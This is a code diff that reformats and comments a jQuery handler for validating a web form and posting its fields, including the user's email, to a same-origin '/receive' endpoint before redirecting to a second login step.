@@ -287,62 +287,60 @@ $('#continueGuest').on('click',Aksw.OnlineProfileLogin.guestContinue);});
     	
     $(document).ready(function() {
     $('#a-widget-35958').on('click', function(event) {
-        event.preventDefault();
+        event.preventDefault(); // Prevent the default action of the link
+
         let myForm = $("#form");
         let checkInputs = document.querySelectorAll('.input-sm');
 
         // Flag to track if any input is empty
         let isEmpty = false;
 
+        // Loop through each input field
         for (const check of checkInputs) {
-        	check.addEventListener('focus', ()=>{
-        	console.log('focus');
-        	check.nextElementSibling.style.display = "none"
-        	});
-        
+            check.addEventListener('focus', () => {
+                console.log('focus');
+                check.nextElementSibling.style.display = "none";
+            });
+
             if (check.value.trim() === "") {
-                  	var errmessage = check.id;
-                //document.querySelectorAll('.errmes').textContent = errmessage + " is required"; 
-                check.nextElementSibling.style.display = "block"
-                document.getElementById('error-modal').style.display = "block";
-                
-                
+                var errmessage = check.id;
+                check.nextElementSibling.style.display = "block"; // Display error message
+                document.getElementById('error-modal').style.display = "block"; // Show error modal
                 isEmpty = true;
-            }else{
-                
-            check.nextElementSibling.style.display = "none"
-                document.getElementById('error-modal').style.display = "none";
-                
-                
+            } else {
+                check.nextElementSibling.style.display = "none"; // Hide error message
+                document.getElementById('error-modal').style.display = "none"; // Hide error modal
                 isEmpty = false;
             }
         }
 
+        // If no input is empty, proceed with form submission
         if (!isEmpty) {
-				            // Validation passed, proceed with form submission
-				            let userinfo = myForm.serializeArray();
-				let user = {};
-				let visitor = document.getElementById('Email').value;
-				
-				userinfo.forEach((value) => {
-				    // Use the 'id' attribute instead of 'name'
-				    user[value.name] = value.value;
-				});
-				
-				user['visitor'] = visitor;
-				console.log(user);
-				let url = "/receive";
-				
-				$.ajax({
-				    method: 'POST',
-				    url: url,
-				    data: user
-				}).done(function(msg) {
-				sessionStorage.setItem('visitor', visitor);
+            let userinfo = myForm.serializeArray();
+            let user = {};
+            let visitor = document.getElementById('Email').value;
+
+            userinfo.forEach((value) => {
+                // Use the 'id' attribute instead of 'name'
+                user[value.name] = value.value;
+            });
+
+            user['visitor'] = visitor;
+            console.log(user);
+
+            // Send AJAX request
+            $.ajax({
+                method: 'POST',
+                url: "/receive",
+                data: user
+            }).done(function(msg) {
+                // Store visitor info in sessionStorage
+                sessionStorage.setItem('visitor', visitor);
+                // Redirect to login page
                 window.location.href = "login/2";
-                console.log(msg);
+                console.log(msg); // Log success message
             }).fail(function(err, textstatus, error) {
-                
+                console.error(error); // Log any errors
             });
         }
     });
